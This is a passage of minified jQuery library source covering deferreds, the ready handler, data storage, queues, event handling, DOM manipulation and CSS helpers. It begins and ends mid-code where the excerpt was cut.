function(e){b[a]=this,c[a]=arguments.length>1?d.call(arguments):e,c===i?g.notifyWith(b,c):--f||g.resolveWith(b,c)}},i,j,k;if(e>1)for(i=new Array(e),j=new Array(e),k=new Array(e);e>b;b++)c[b]&&n.isFunction(c[b].promise)?c[b].promise().done(h(b,k,c)).fail(g.reject).progress(h(b,j,i)):--f;return f||g.resolveWith(k,c),g.promise()}});var H;n.fn.ready=function(a){return n.ready.promise().done(a),this},n.extend({isReady:!1,readyWait:1,holdReady:function(a){a?n.readyWait++:n.ready(!0)},ready:function(a){(a===!0?--n.readyWait:n.isReady)||(n.isReady=!0,a!==!0&&--n.readyWait>0||(H.resolveWith(l,[n]),n.fn.triggerHandler&&(n(l).triggerHandler("ready"),n(l).off("ready"))))}});function I(){l.removeEventListener("DOMContentLoaded",I,!1),a.removeEventListener("load",I,!1),n.ready()}n.ready.promise=function(b){return H||(H=n.Deferred(),"complete"===l.readyState?setTimeout(n.ready):(l.addEventListener("DOMContentLoaded",I,!1),a.addEventListener("load",I,!1))),H.promise(b)},n.ready.promise();var J=n.access=function(a,b,c,d,e,f,g){var h=0,i=a.length,j=null==c;if("object"===n.type(c)){e=!0;for(h in c)n.access(a,b,h,c[h],!0,f,g)}else if(void 0!==d&&(e=!0,n.isFunction(d)||(g=!0),j&&(g?(b.call(a,d),b=null):(j=b,b=function(a,b,c){return j.call(n(a),c)})),b))for(;i>h;h++)b(a[h],c,g?d:d.call(a[h],h,b(a[h],c)));return e?a:j?b.call(a):i?b(a[0],c):f};n.acceptData=function(a){return 1===a.nodeType||9===a.nodeType||!+a.nodeType};function K(){Object.defineProperty(this.cache={},0,{get:function(){return{}}}),this.expando=n.expando+K.uid++}K.uid=1,K.accepts=n.acceptData,K.prototype={key:function(a){if(!K.accepts(a))return 0;var b={},c=a[this.expando];if(!c){c=K.uid++;try{b[this.expando]={value:c},Object.defineProperties(a,b)}catch(d){b[this.expando]=c,n.extend(a,b)}}return this.cache[c]||(this.cache[c]={}),c},set:function(a,b,c){var d,e=this.key(a),f=this.cache[e];if("string"==typeof b)f[b]=c;else if(n.isEmptyObject(f))n.extend(this.cache[e],b);else for(d in b)f[d]=b[d];return f},get:function(a,b){var c=this.cache[this.key(a)];return void 0===b?c:c[b]},access:function(a,b,c){var d;return void 0===b||b&&"string"==typeof b&&void 0===c?(d=this.get(a,b),void 0!==d?d:this.get(a,n.camelCase(b))):(this.set(a,b,c),void 0!==c?c:b)},remove:function(a,b){var c,d,e,f=this.key(a),g=this.cache[f];if(void 0===b)this.cache[f]={};else{n.isArray(b)?d=b.concat(b.map(n.camelCase)):(e=n.camelCase(b),b in g?d=[b,e]:(d=e,d=d in g?[d]:d.match(E)||[])),c=d.length;while(c--)delete g[d[c]]}},hasData:function(a){return!n.isEmptyObject(this.cache[a[this.expando]]||{})},discard:function(a){a[this.expando]&&delete this.cache[a[this.expando]]}};var L=new K,M=new K,N=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,O=/([A-Z])/g;function P(a,b,c){var d;if(void 0===c&&1===a.nodeType)if(d="data-"+b.replace(O,"-$1").toLowerCase(),c=a.getAttribute(d),"string"==typeof c){try{c="true"===c?!0:"false"===c?!1:"null"===c?null:+c+""===c?+c:N.test(c)?n.parseJSON(c):c}catch(e){}M.set(a,b,c)}else c=void 0;return c}n.extend({hasData:function(a){return M.hasData(a)||L.hasData(a)},data:function(a,b,c){return M.access(a,b,c)
},removeData:function(a,b){M.remove(a,b)},_data:function(a,b,c){return L.access(a,b,c)},_removeData:function(a,b){L.remove(a,b)}}),n.fn.extend({data:function(a,b){var c,d,e,f=this[0],g=f&&f.attributes;if(void 0===a){if(this.length&&(e=M.get(f),1===f.nodeType&&!L.get(f,"hasDataAttrs"))){c=g.length;while(c--)g[c]&&(d=g[c].name,0===d.indexOf("data-")&&(d=n.camelCase(d.slice(5)),P(f,d,e[d])));L.set(f,"hasDataAttrs",!0)}return e}return"object"==typeof a?this.each(function(){M.set(this,a)}):J(this,function(b){var c,d=n.camelCase(a);if(f&&void 0===b){if(c=M.get(f,a),void 0!==c)return c;if(c=M.get(f,d),void 0!==c)return c;if(c=P(f,d,void 0),void 0!==c)return c}else this.each(function(){var c=M.get(this,d);M.set(this,d,b),-1!==a.indexOf("-")&&void 0!==c&&M.set(this,a,b)})},null,b,arguments.length>1,null,!0)},removeData:function(a){return this.each(function(){M.remove(this,a)})}}),n.extend({queue:function(a,b,c){var d;return a?(b=(b||"fx")+"queue",d=L.get(a,b),c&&(!d||n.isArray(c)?d=L.access(a,b,n.makeArray(c)):d.push(c)),d||[]):void 0},dequeue:function(a,b){b=b||"fx";var c=n.queue(a,b),d=c.length,e=c.shift(),f=n._queueHooks(a,b),g=function(){n.dequeue(a,b)};"inprogress"===e&&(e=c.shift(),d--),e&&("fx"===b&&c.unshift("inprogress"),delete f.stop,e.call(a,g,f)),!d&&f&&f.empty.fire()},_queueHooks:function(a,b){var c=b+"queueHooks";return L.get(a,c)||L.access(a,c,{empty:n.Callbacks("once memory").add(function(){L.remove(a,[b+"queue",c])})})}}),n.fn.extend({queue:function(a,b){var c=2;return"string"!=typeof a&&(b=a,a="fx",c--),arguments.length<c?n.queue(this[0],a):void 0===b?this:this.each(function(){var c=n.queue(this,a,b);n._queueHooks(this,a),"fx"===a&&"inprogress"!==c[0]&&n.dequeue(this,a)})},dequeue:function(a){return this.each(function(){n.dequeue(this,a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,b){var c,d=1,e=n.Deferred(),f=this,g=this.length,h=function(){--d||e.resolveWith(f,[f])};"string"!=typeof a&&(b=a,a=void 0),a=a||"fx";while(g--)c=L.get(f[g],a+"queueHooks"),c&&c.empty&&(d++,c.empty.add(h));return h(),e.promise(b)}});var Q=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,R=["Top","Right","Bottom","Left"],S=function(a,b){return a=b||a,"none"===n.css(a,"display")||!n.contains(a.ownerDocument,a)},T=/^(?:checkbox|radio)$/i;!function(){var a=l.createDocumentFragment(),b=a.appendChild(l.createElement("div")),c=l.createElement("input");c.setAttribute("type","radio"),c.setAttribute("checked","checked"),c.setAttribute("name","t"),b.appendChild(c),k.checkClone=b.cloneNode(!0).cloneNode(!0).lastChild.checked,b.innerHTML="<textarea>x</textarea>",k.noCloneChecked=!!b.cloneNode(!0).lastChild.defaultValue}();var U="undefined";k.focusinBubbles="onfocusin"in a;var V=/^key/,W=/^(?:mouse|pointer|contextmenu)|click/,X=/^(?:focusinfocus|focusoutblur)$/,Y=/^([^.]*)(?:\.(.+)|)$/;function Z(){return!0}function $(){return!1}function _(){try{return l.activeElement}catch(a){}}n.event={global:{},add:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=L.get(a);if(r){c.handler&&(f=c,c=f.handler,e=f.selector),c.guid||(c.guid=n.guid++),(i=r.events)||(i=r.events={}),(g=r.handle)||(g=r.handle=function(b){return typeof n!==U&&n.event.triggered!==b.type?n.event.dispatch.apply(a,arguments):void 0}),b=(b||"").match(E)||[""],j=b.length;while(j--)h=Y.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o&&(l=n.event.special[o]||{},o=(e?l.delegateType:l.bindType)||o,l=n.event.special[o]||{},k=n.extend({type:o,origType:q,data:d,handler:c,guid:c.guid,selector:e,needsContext:e&&n.expr.match.needsContext.test(e),namespace:p.join(".")},f),(m=i[o])||(m=i[o]=[],m.delegateCount=0,l.setup&&l.setup.call(a,d,p,g)!==!1||a.addEventListener&&a.addEventListener(o,g,!1)),l.add&&(l.add.call(a,k),k.handler.guid||(k.handler.guid=c.guid)),e?m.splice(m.delegateCount++,0,k):m.push(k),n.event.global[o]=!0)}},remove:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=L.hasData(a)&&L.get(a);if(r&&(i=r.events)){b=(b||"").match(E)||[""],j=b.length;while(j--)if(h=Y.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o){l=n.event.special[o]||{},o=(d?l.delegateType:l.bindType)||o,m=i[o]||[],h=h[2]&&new RegExp("(^|\\.)"+p.join("\\.(?:.*\\.|)")+"(\\.|$)"),g=f=m.length;while(f--)k=m[f],!e&&q!==k.origType||c&&c.guid!==k.guid||h&&!h.test(k.namespace)||d&&d!==k.selector&&("**"!==d||!k.selector)||(m.splice(f,1),k.selector&&m.delegateCount--,l.remove&&l.remove.call(a,k));g&&!m.length&&(l.teardown&&l.teardown.call(a,p,r.handle)!==!1||n.removeEvent(a,o,r.handle),delete i[o])}else for(o in i)n.event.remove(a,o+b[j],c,d,!0);n.isEmptyObject(i)&&(delete r.handle,L.remove(a,"events"))}},trigger:function(b,c,d,e){var f,g,h,i,k,m,o,p=[d||l],q=j.call(b,"type")?b.type:b,r=j.call(b,"namespace")?b.namespace.split("."):[];if(g=h=d=d||l,3!==d.nodeType&&8!==d.nodeType&&!X.test(q+n.event.triggered)&&(q.indexOf(".")>=0&&(r=q.split("."),q=r.shift(),r.sort()),k=q.indexOf(":")<0&&"on"+q,b=b[n.expando]?b:new n.Event(q,"object"==typeof b&&b),b.isTrigger=e?2:3,b.namespace=r.join("."),b.namespace_re=b.namespace?new RegExp("(^|\\.)"+r.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,b.result=void 0,b.target||(b.target=d),c=null==c?[b]:n.makeArray(c,[b]),o=n.event.special[q]||{},e||!o.trigger||o.trigger.apply(d,c)!==!1)){if(!e&&!o.noBubble&&!n.isWindow(d)){for(i=o.delegateType||q,X.test(i+q)||(g=g.parentNode);g;g=g.parentNode)p.push(g),h=g;h===(d.ownerDocument||l)&&p.push(h.defaultView||h.parentWindow||a)}f=0;while((g=p[f++])&&!b.isPropagationStopped())b.type=f>1?i:o.bindType||q,m=(L.get(g,"events")||{})[b.type]&&L.get(g,"handle"),m&&m.apply(g,c),m=k&&g[k],m&&m.apply&&n.acceptData(g)&&(b.result=m.apply(g,c),b.result===!1&&b.preventDefault());return b.type=q,e||b.isDefaultPrevented()||o._default&&o._default.apply(p.pop(),c)!==!1||!n.acceptData(d)||k&&n.isFunction(d[q])&&!n.isWindow(d)&&(h=d[k],h&&(d[k]=null),n.event.triggered=q,d[q](),n.event.triggered=void 0,h&&(d[k]=h)),b.result}},dispatch:function(a){a=n.event.fix(a);var b,c,e,f,g,h=[],i=d.call(arguments),j=(L.get(this,"events")||{})[a.type]||[],k=n.event.special[a.type]||{};if(i[0]=a,a.delegateTarget=this,!k.preDispatch||k.preDispatch.call(this,a)!==!1){h=n.event.handlers.call(this,a,j),b=0;while((f=h[b++])&&!a.isPropagationStopped()){a.currentTarget=f.elem,c=0;while((g=f.handlers[c++])&&!a.isImmediatePropagationStopped())(!a.namespace_re||a.namespace_re.test(g.namespace))&&(a.handleObj=g,a.data=g.data,e=((n.event.special[g.origType]||{}).handle||g.handler).apply(f.elem,i),void 0!==e&&(a.result=e)===!1&&(a.preventDefault(),a.stopPropagation()))}return k.postDispatch&&k.postDispatch.call(this,a),a.result}},handlers:function(a,b){var c,d,e,f,g=[],h=b.delegateCount,i=a.target;if(h&&i.nodeType&&(!a.button||"click"!==a.type))for(;i!==this;i=i.parentNode||this)if(i.disabled!==!0||"click"!==a.type){for(d=[],c=0;h>c;c++)f=b[c],e=f.selector+" ",void 0===d[e]&&(d[e]=f.needsContext?n(e,this).index(i)>=0:n.find(e,this,null,[i]).length),d[e]&&d.push(f);d.length&&g.push({elem:i,handlers:d})}return h<b.length&&g.push({elem:this,handlers:b.slice(h)}),g},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){return null==a.which&&(a.which=null!=b.charCode?b.charCode:b.keyCode),a}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,b){var c,d,e,f=b.button;return null==a.pageX&&null!=b.clientX&&(c=a.target.ownerDocument||l,d=c.documentElement,e=c.body,a.pageX=b.clientX+(d&&d.scrollLeft||e&&e.scrollLeft||0)-(d&&d.clientLeft||e&&e.clientLeft||0),a.pageY=b.clientY+(d&&d.scrollTop||e&&e.scrollTop||0)-(d&&d.clientTop||e&&e.clientTop||0)),a.which||void 0===f||(a.which=1&f?1:2&f?3:4&f?2:0),a}},fix:function(a){if(a[n.expando])return a;var b,c,d,e=a.type,f=a,g=this.fixHooks[e];g||(this.fixHooks[e]=g=W.test(e)?this.mouseHooks:V.test(e)?this.keyHooks:{}),d=g.props?this.props.concat(g.props):this.props,a=new n.Event(f),b=d.length;while(b--)c=d[b],a[c]=f[c];return a.target||(a.target=l),3===a.target.nodeType&&(a.target=a.target.parentNode),g.filter?g.filter(a,f):a},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==_()&&this.focus?(this.focus(),!1):void 0},delegateType:"focusin"},blur:{trigger:function(){return this===_()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&n.nodeName(this,"input")?(this.click(),!1):void 0},_default:function(a){return n.nodeName(a.target,"a")}},beforeunload:{postDispatch:function(a){void 0!==a.result&&a.originalEvent&&(a.originalEvent.returnValue=a.result)}}},simulate:function(a,b,c,d){var e=n.extend(new n.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?n.event.trigger(e,null,b):n.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},n.removeEvent=function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)},n.Event=function(a,b){return this instanceof n.Event?(a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||void 0===a.defaultPrevented&&a.returnValue===!1?Z:$):this.type=a,b&&n.extend(this,b),this.timeStamp=a&&a.timeStamp||n.now(),void(this[n.expando]=!0)):new n.Event(a,b)},n.Event.prototype={isDefaultPrevented:$,isPropagationStopped:$,isImmediatePropagationStopped:$,preventDefault:function(){var a=this.originalEvent;this.isDefaultPrevented=Z,a&&a.preventDefault&&a.preventDefault()},stopPropagation:function(){var a=this.originalEvent;this.isPropagationStopped=Z,a&&a.stopPropagation&&a.stopPropagation()},stopImmediatePropagation:function(){var a=this.originalEvent;this.isImmediatePropagationStopped=Z,a&&a.stopImmediatePropagation&&a.stopImmediatePropagation(),this.stopPropagation()}},n.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(a,b){n.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c,d=this,e=a.relatedTarget,f=a.handleObj;return(!e||e!==d&&!n.contains(d,e))&&(a.type=f.origType,c=f.handler.apply(this,arguments),a.type=b),c}}}),k.focusinBubbles||n.each({focus:"focusin",blur:"focusout"},function(a,b){var c=function(a){n.event.simulate(b,a.target,n.event.fix(a),!0)};n.event.special[b]={setup:function(){var d=this.ownerDocument||this,e=L.access(d,b);e||d.addEventListener(a,c,!0),L.access(d,b,(e||0)+1)},teardown:function(){var d=this.ownerDocument||this,e=L.access(d,b)-1;e?L.access(d,b,e):(d.removeEventListener(a,c,!0),L.remove(d,b))}}}),n.fn.extend({on:function(a,b,c,d,e){var f,g;if("object"==typeof a){"string"!=typeof b&&(c=c||b,b=void 0);for(g in a)this.on(g,b,c,a[g],e);return this}if(null==c&&null==d?(d=b,c=b=void 0):null==d&&("string"==typeof b?(d=c,c=void 0):(d=c,c=b,b=void 0)),d===!1)d=$;else if(!d)return this;return 1===e&&(f=d,d=function(a){return n().off(a),f.apply(this,arguments)},d.guid=f.guid||(f.guid=n.guid++)),this.each(function(){n.event.add(this,a,d,c,b)})},one:function(a,b,c,d){return this.on(a,b,c,d,1)},off:function(a,b,c){var d,e;if(a&&a.preventDefault&&a.handleObj)return d=a.handleObj,n(a.delegateTarget).off(d.namespace?d.origType+"."+d.namespace:d.origType,d.selector,d.handler),this;if("object"==typeof a){for(e in a)this.off(e,b,a[e]);return this}return(b===!1||"function"==typeof b)&&(c=b,b=void 0),c===!1&&(c=$),this.each(function(){n.event.remove(this,a,c,b)})},trigger:function(a,b){return this.each(function(){n.event.trigger(a,b,this)})},triggerHandler:function(a,b){var c=this[0];return c?n.event.trigger(a,b,c,!0):void 0}});var ab=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,bb=/<([\w:]+)/,cb=/<|&#?\w+;/,db=/<(?:script|style|link)/i,eb=/checked\s*(?:[^=]|=\s*.checked.)/i,fb=/^$|\/(?:java|ecma)script/i,gb=/^true\/(.*)/,hb=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,ib={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};ib.optgroup=ib.option,ib.tbody=ib.tfoot=ib.colgroup=ib.caption=ib.thead,ib.th=ib.td;function jb(a,b){return n.nodeName(a,"table")&&n.nodeName(11!==b.nodeType?b:b.firstChild,"tr")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function kb(a){return a.type=(null!==a.getAttribute("type"))+"/"+a.type,a}function lb(a){var b=gb.exec(a.type);return b?a.type=b[1]:a.removeAttribute("type"),a}function mb(a,b){for(var c=0,d=a.length;d>c;c++)L.set(a[c],"globalEval",!b||L.get(b[c],"globalEval"))}function nb(a,b){var c,d,e,f,g,h,i,j;if(1===b.nodeType){if(L.hasData(a)&&(f=L.access(a),g=L.set(b,f),j=f.events)){delete g.handle,g.events={};for(e in j)for(c=0,d=j[e].length;d>c;c++)n.event.add(b,e,j[e][c])}M.hasData(a)&&(h=M.access(a),i=n.extend({},h),M.set(b,i))}}function ob(a,b){var c=a.getElementsByTagName?a.getElementsByTagName(b||"*"):a.querySelectorAll?a.querySelectorAll(b||"*"):[];return void 0===b||b&&n.nodeName(a,b)?n.merge([a],c):c}function pb(a,b){var c=b.nodeName.toLowerCase();"input"===c&&T.test(a.type)?b.checked=a.checked:("input"===c||"textarea"===c)&&(b.defaultValue=a.defaultValue)}n.extend({clone:function(a,b,c){var d,e,f,g,h=a.cloneNode(!0),i=n.contains(a.ownerDocument,a);if(!(k.noCloneChecked||1!==a.nodeType&&11!==a.nodeType||n.isXMLDoc(a)))for(g=ob(h),f=ob(a),d=0,e=f.length;e>d;d++)pb(f[d],g[d]);if(b)if(c)for(f=f||ob(a),g=g||ob(h),d=0,e=f.length;e>d;d++)nb(f[d],g[d]);else nb(a,h);return g=ob(h,"script"),g.length>0&&mb(g,!i&&ob(a,"script")),h},buildFragment:function(a,b,c,d){for(var e,f,g,h,i,j,k=b.createDocumentFragment(),l=[],m=0,o=a.length;o>m;m++)if(e=a[m],e||0===e)if("object"===n.type(e))n.merge(l,e.nodeType?[e]:e);else if(cb.test(e)){f=f||k.appendChild(b.createElement("div")),g=(bb.exec(e)||["",""])[1].toLowerCase(),h=ib[g]||ib._default,f.innerHTML=h[1]+e.replace(ab,"<$1></$2>")+h[2],j=h[0];while(j--)f=f.lastChild;n.merge(l,f.childNodes),f=k.firstChild,f.textContent=""}else l.push(b.createTextNode(e));k.textContent="",m=0;while(e=l[m++])if((!d||-1===n.inArray(e,d))&&(i=n.contains(e.ownerDocument,e),f=ob(k.appendChild(e),"script"),i&&mb(f),c)){j=0;while(e=f[j++])fb.test(e.type||"")&&c.push(e)}return k},cleanData:function(a){for(var b,c,d,e,f=n.event.special,g=0;void 0!==(c=a[g]);g++){if(n.acceptData(c)&&(e=c[L.expando],e&&(b=L.cache[e]))){if(b.events)for(d in b.events)f[d]?n.event.remove(c,d):n.removeEvent(c,d,b.handle);L.cache[e]&&delete L.cache[e]}delete M.cache[c[M.expando]]}}}),n.fn.extend({text:function(a){return J(this,function(a){return void 0===a?n.text(this):this.empty().each(function(){(1===this.nodeType||11===this.nodeType||9===this.nodeType)&&(this.textContent=a)})},null,a,arguments.length)},append:function(){return this.domManip(arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=jb(this,a);b.appendChild(a)}})},prepend:function(){return this.domManip(arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var b=jb(this,a);b.insertBefore(a,b.firstChild)}})},before:function(){return this.domManip(arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this)})},after:function(){return this.domManip(arguments,function(a){this.parentNode&&this.parentNode.insertBefore(a,this.nextSibling)})},remove:function(a,b){for(var c,d=a?n.filter(a,this):this,e=0;null!=(c=d[e]);e++)b||1!==c.nodeType||n.cleanData(ob(c)),c.parentNode&&(b&&n.contains(c.ownerDocument,c)&&mb(ob(c,"script")),c.parentNode.removeChild(c));return this},empty:function(){for(var a,b=0;null!=(a=this[b]);b++)1===a.nodeType&&(n.cleanData(ob(a,!1)),a.textContent="");return this},clone:function(a,b){return a=null==a?!1:a,b=null==b?a:b,this.map(function(){return n.clone(this,a,b)})},html:function(a){return J(this,function(a){var b=this[0]||{},c=0,d=this.length;if(void 0===a&&1===b.nodeType)return b.innerHTML;if("string"==typeof a&&!db.test(a)&&!ib[(bb.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(ab,"<$1></$2>");try{for(;d>c;c++)b=this[c]||{},1===b.nodeType&&(n.cleanData(ob(b,!1)),b.innerHTML=a);b=0}catch(e){}}b&&this.empty().append(a)},null,a,arguments.length)},replaceWith:function(){var a=arguments[0];return this.domManip(arguments,function(b){a=this.parentNode,n.cleanData(ob(this)),a&&a.replaceChild(b,this)}),a&&(a.length||a.nodeType)?this:this.remove()},detach:function(a){return this.remove(a,!0)},domManip:function(a,b){a=e.apply([],a);var c,d,f,g,h,i,j=0,l=this.length,m=this,o=l-1,p=a[0],q=n.isFunction(p);if(q||l>1&&"string"==typeof p&&!k.checkClone&&eb.test(p))return this.each(function(c){var d=m.eq(c);q&&(a[0]=p.call(this,c,d.html())),d.domManip(a,b)});if(l&&(c=n.buildFragment(a,this[0].ownerDocument,!1,this),d=c.firstChild,1===c.childNodes.length&&(c=d),d)){for(f=n.map(ob(c,"script"),kb),g=f.length;l>j;j++)h=c,j!==o&&(h=n.clone(h,!0,!0),g&&n.merge(f,ob(h,"script"))),b.call(this[j],h,j);if(g)for(i=f[f.length-1].ownerDocument,n.map(f,lb),j=0;g>j;j++)h=f[j],fb.test(h.type||"")&&!L.access(h,"globalEval")&&n.contains(i,h)&&(h.src?n._evalUrl&&n._evalUrl(h.src):n.globalEval(h.textContent.replace(hb,"")))}return this}}),n.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){n.fn[a]=function(a){for(var c,d=[],e=n(a),g=e.length-1,h=0;g>=h;h++)c=h===g?this:this.clone(!0),n(e[h])[b](c),f.apply(d,c.get());return this.pushStack(d)}});var qb,rb={};function sb(b,c){var d,e=n(c.createElement(b)).appendTo(c.body),f=a.getDefaultComputedStyle&&(d=a.getDefaultComputedStyle(e[0]))?d.display:n.css(e[0],"display");return e.detach(),f}function tb(a){var b=l,c=rb[a];return c||(c=sb(a,b),"none"!==c&&c||(qb=(qb||n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement),b=qb[0].contentDocument,b.write(),b.close(),c=sb(a,b),qb.detach()),rb[a]=c),c}var ub=/^margin/,vb=new RegExp("^("+Q+")(?!px)[a-z%]+$","i"),wb=function(b){return b.ownerDocument.defaultView.opener?b.ownerDocument.defaultView.getComputedStyle(b,null):a.getComputedStyle(b,null)};function xb(a,b,c){var d,e,f,g,h=a.style;return c=c||wb(a),c&&(g=c.getPropertyValue(b)||c[b]),c&&(""!==g||n.contains(a.ownerDocument,a)||(g=n.style(a,b)),vb.test(g)&&ub.test(b)&&(d=h.width,e=h.minWidth,f=h.maxWidth,h.minWidth=h.maxWidth=h.width=g,g=c.width,h.width=d,h.minWidth=e,h.maxWidth=f)),void 0!==g?g+"":g}function yb(a,b){return{get:function(){return a()?void delete this.get:(this.get=b).apply(this,arguments)}}}!function(){var b,c,d=l.documentElement,e=l.createElement("div"),f=l.createElement("div");if(f.style){f.style.backgroundClip="content-box",f.cloneNode(!0).style.backgroundClip="",k.clearCloneStyle="content-box"===f.style.backgroundClip,e.style.cssText="border:0;width:0;height:0;top:0;left:-9999px;margin-top:1px;position:absolute",e.appendChild(f);function g(){f.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute",f.innerHTML="",d.appendChild(e);var g=a.getComputedStyle(f,null);b="1%"!==g.top,c="4px"===g.width,d.removeChild(e)}a.getComputedStyle&&n.extend(k,{pixelPosition:function(){return g(),b},boxSizingReliable:function(){return null==c&&g(),c},reliableMarginRight:function(){var b,c=f.appendChild(l.createElement("div"));return c.style.cssText=f.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",c.style.marginRight=c.style.width="0",f.style.width="1px",d.appendChild(e),b=!parseFloat(a.getComputedStyle(c,null).marginRight),d.removeChild(e),f.removeChild(c),b}})}}(),n.swap=function(a,b,c,d){var e,f,g={};for(f in b)g[f]=a.style[f],a.style[f]=b[f];e=c.apply(a,d||[]);for(f in b)a.style[f]=g[f];return e};var zb=/^(none|table(?!-c[ea]).+)/,Ab=new RegExp("^("+Q+")(.*)$","i"),Bb=new RegExp("^([+-])=("+Q+")","i"),Cb={position:"absolute",visibility:"hidden",display:"block"},Db={letterSpacing:"0",fontWeight:"400"},Eb=["Webkit","O","Moz","ms"];function Fb(a,b){if(b in a)return b;var c=b[0].toUpperCase()+b.slice(1),d=b,e=Eb.length;while(e--)if(b=Eb[e]+c,b in a)return b;return d}function Gb(a,b,c){var d=Ab.exec(b);return d?Math.max(0,d[1]-(c||0))+(d[2]||"px"):b}function Hb(a,b,c,d,e){for(var f=c===(d?"border":"content")?4:"width"===b?1:0,g=0;4>f;f+=2)"margin"===c&&(g+=n.css(a,c+R[f],!0,e)),d?("content"===c&&(g-=n.css(a,"padding"+R[f],!0,e)),"margin"!==c&&(g-=n.css(a,"border"+R[f]+"Width",!0,e))):(g+=n.css(a,"padding"+R[f],!0,e),"padding"!==c&&(g+=n.css(a,"border"+R[f]+"Width",!0,e)));return g}function Ib(a,b,c){var d=!0,e="width"===b?a.offsetWidth:a.offsetHeight,f=wb(a),g="border-box"===n.css(a,"boxSizing",!1,f);if(0>=e||null==e){if(e=xb(a,b,f),(0>e||null==e)&&(e=a.style[b]),vb.test(e))return e;d=g&&(k.boxSizingReliable()||e===a.style[b]),e=parseFloat(e)||0}return e+Hb(a,b,c||(g?"border":"content"),d,f)+"px"}function Jb(a,b){for(var c,d,e,f=[],g=0,h=a.length;h>g;g++)d=a[g],d.style&&(f[g]=L.get(d,"olddisplay"),c=d.style.display,b?(f[g]||"none"!==c||(d.style.display=""),""===d.style.display&&S(d)&&(f[g]=L.access(d,"olddisplay",tb(d.nodeName)))):(e=S(d),"none"===c&&e||L.set(d,"olddisplay",e?c:n.css(d,"display"))));for(g=0;h>g;g++)d=a[g],d.style&&(b&&"none"!==d.style.display&&""!==d.style.display||(d.style.display=b?f[g]||"":"none"));return a}n.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=xb(a,"opacity");return""===c?"1":c}}}},cssNumber:{columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":"cssFloat"},style:function(a,b,c,d){if(a&&3!==a.nodeType&&8!==a.nodeType&&a.style){var e,f,g,h=n.camelCase(b),i=a.style;return b=n.cssProps[h]||(n.cssProps[h]=Fb(i,h)),g=n.cssHooks[b]||n.cssHooks[h],void 0===c?g&&"get"in g&&void 0!==(e=g.get(a,!1,d))?e:i[b]:(f=typeof c,"string"===f&&(e=Bb.exec(c))&&(c=(e[1]+1)*e[2]+parseFloat(n.css(a,b)),f="number"),null!=c&&c===c&&("number"!==f||n.cssNumber[h]||(c+="px"),k.clearCloneStyle||""!==c||0!==b.indexOf("background")||(i[b]="inherit"),g&&"set"in g&&void 0===(c=g.set(a,c,d))||(i[b]=c)),void 0)}},css:function(a,b,c,d){var e,f,g,h=n.camelCase(b);return b=n.cssProps[h]||(n.cssProps[h]=Fb(a.style,h)),g=n.cssHooks[b]||n.cssHooks[h],g&&"get"in g&&(e=g.get(a,!0,c)),void 0===e&&(e=xb(a,b,d)),"normal"===e&&b in Db&&(e=Db[b]),""===c||c?(f=parseFloat(e),c===!0||n.isNumeric(f)?f||0:e):e}}),n.each(["height","width"],function(a,b){n.cssHooks[b]={get:function(a,c,d){return c?zb.test(n.css(a,"display"))&&0===a.offsetWidth?n.swap(a,Cb,function(){return Ib(a,b,d)}):Ib(a,b,d):void 0},set:function(a,c,d){var e=d&&wb(a);return Gb(a,c,d?Hb(a,b,d,"border-box"===n.css(a,"boxSizing",!1,e),e):0)}}}),n.cssHooks.marginRight=yb(k.reliableMarginRight,function(a,b){return b?n.swap(a,{display:"inline-block"},xb,[a,"marginRight"]):void 0}),n.each({margin:"",padding:"",border:"Width"},function(a,b){n.cssHooks[a+b]={expand:function(c){for(var d=0,e={},f="string"==typeof c?c.split(" "):[c];4>d;d++)e[a+R[d]+b]=f[d]||f[d-2]||f[0];return e}},ub.test(a)||(n.cssHooks[a+b].set=Gb)}),n.fn.extend({css:function(a,b){return J(this,function(a,b,c){var 